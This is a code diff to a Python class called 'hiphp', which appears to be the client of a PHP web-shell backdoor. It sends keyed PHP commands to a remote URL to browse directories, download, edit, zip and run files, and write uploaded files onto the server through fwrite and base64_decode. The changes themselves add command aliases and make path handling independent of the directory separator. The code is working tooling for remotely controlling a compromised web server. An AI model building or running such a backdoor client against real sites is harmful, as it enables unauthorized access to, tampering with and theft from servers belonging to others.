@@ -69,6 +69,8 @@ class hiphp:
         #
         self.sep=os.sep
 
+        self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
+
     #cli:
     def cli(self):
         #logo
@@ -121,7 +123,7 @@ class hiphp:
             elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
                 print(about())
             #download
-            elif command[0:6].lower()=="--down" or command[0:4].lower()=="down":
+            elif command[0:6].lower()=="--down" or command[0:4].lower()=="down" or command[0:8].lower()=="download":
                 down=command.split(" ")
                 try:
                     if down[1].lower()=="-f":
@@ -164,13 +166,16 @@ class hiphp:
                     help(__version__,"--down")
             #zip
             elif command[0:5].lower()=="--zip" or command[0:3].lower()=="zip":
-                ziping=command.split(" ")
+                
                 try:
-                    zip_file_name=hiphp.compress(self,ziping[1])
+                    ziping=command.split(" ")[1]
+                    try:
+                        zip_file_name=hiphp.compress(self,ziping)
+                    except:
+                        zip_file_name=hiphp.compress(self)
+                    print(smsg_2+reee+self.DS+zip_file_name)
                 except:
-                    zip_file_name=hiphp.compress(self)
-                print(smsg_2+reee+"/"+zip_file_name)
-
+                    help(__version__,"--zip")
             #update
             elif command[0:8].lower()=="--update" or command[0:6].lower()=="update":
                 r="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/version.txt"
@@ -199,12 +204,12 @@ class hiphp:
                 elif command[0:4].lower()=="--ls" and command[5:9].lower()=="-all":
                     dirx=command[10:]
                     if dirx=="":
-                        dirx="./"
+                        dirx="."+self.DS
                     command=scandir_all(dirx)
                 elif command[0:2].lower()=="ls" and command[3:7].lower()=="-all":
                     dirx=command[8:]
                     if dirx=="":
-                        dirx="./"
+                        dirx="."+self.DS
                     command=scandir_all(dirx)
                 else:
                     if len(command)==4:
@@ -212,8 +217,8 @@ class hiphp:
                     else:
                         dirx=command[3:]
                     
-                    if dirx[-1]!="/":
-                        dirx+="/"
+                    if dirx[-1]!=self.DS:
+                        dirx+=self.DS
                     command=scandir(dirx)
                 sd=hiphp.do(self,self.key,self.url,self.headers,True,command)
                 x=ast.literal_eval(sd)
@@ -226,9 +231,9 @@ class hiphp:
             elif command[0:4].lower()=="--cd" or command[0:2].lower()=="cd":
                 self.cd=""
                 if command[0:4].lower()=="--cd":
-                    self.cd=f"chdir('{reee}/{command[5:]}');"
+                    self.cd=f"chdir('{reee}{self.DS}{command[5:]}');"
                 else:
-                    self.cd=f"chdir('{reee}/{command[3:]}');"
+                    self.cd=f"chdir('{reee}{self.DS}{command[3:]}');"
             #set
             elif command[0:5].lower()=="--set" or command[0:3].lower()=="set":
                 if command[0:5].lower()=="--set":
@@ -253,11 +258,12 @@ class hiphp:
                 command=file_get_contents(dirx)
                 hiphp.do(self,self.key,self.url,self.headers,False,command)
             #cat
-            elif command[0:5].lower()=="--edt" or command[0:3].lower()=="edt":
-                if command[0:5].lower()=="--edt":
-                    dirx=command[6:]
-                else:
-                    dirx=command[4:]
+            elif command[0:5].lower()=="--edt" or command[0:3].lower()=="edt" or command[0:4].lower()=="edit":
+                dirx=command.split(" ")[1]
+                #if command[0:5].lower()=="--edt":
+                #    dirx=command[6:]
+                #else:
+                #    dirx=command[4:]
                 
                 try:
                     from_path=os.path.dirname(dirx)
@@ -270,7 +276,7 @@ class hiphp:
                 if from_path=="":
                     hiphp.upload(self,out_path)
                 else:
-                    hiphp.upload(self,out_path,from_path+"/")
+                    hiphp.upload(self,out_path,from_path+self.DS)
                 os.remove(out_path)
                 #os.system('cls' if os.name == 'nt' else 'clear')
                 #print(out_path)
@@ -280,21 +286,21 @@ class hiphp:
                 command=php_info()
                 hiphp.do(self,self.key,self.url,self.headers,False,command)
             #rf
-            elif command[0:4].lower()=="--rf" or command[0:2].lower()=="rf":
+            elif command[0:4].lower()=="--rf" or command[0:2].lower()=="rf" or command[0:3].lower()=="run":
                 varss=command.split(" ")
                 if varss[len(varss)-1]=="":
                     del varss[len(varss)-1]
                 print(hiphp.run_file(self,varss[1],varss[2:]))
             #up
-            elif command[0:4].lower()=="--up" or command[0:2].lower()=="up":
+            elif command[0:4].lower()=="--up" or command[0:2].lower()=="up" or command[0:6].lower()=="upload":
                 v=command.split(" ")
                 #print(v)
                 if len(v)>2:
                 #try:
                     file_path=v[1]
                     to=v[2]
-                    if to[len(to)-1:len(to)]!="/":
-                        to=to+"/"
+                    if to[len(to)-1:len(to)]!=self.DS:
+                        to=to+self.DS
                     hiphp.upload(self,file_path,to)                    
                 #except:
                 else:
@@ -385,8 +391,8 @@ class hiphp:
                 encoded_string=tobase64(base64_file.read().decode("utf-8"))
             p=""
             if to!="":
-                if to[0:2]!="./":
-                    p="./"
+                if to[0:2]!="."+self.DS:
+                    p="."+self.DS
                 hiphp.run(self,"if(!file_exists('"+p+to+"')){mkdir('"+p+to+"',0777,true);}")
             hiphp.run(self,f'Fwrite(fopen("{p+to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string}"));')
         except:
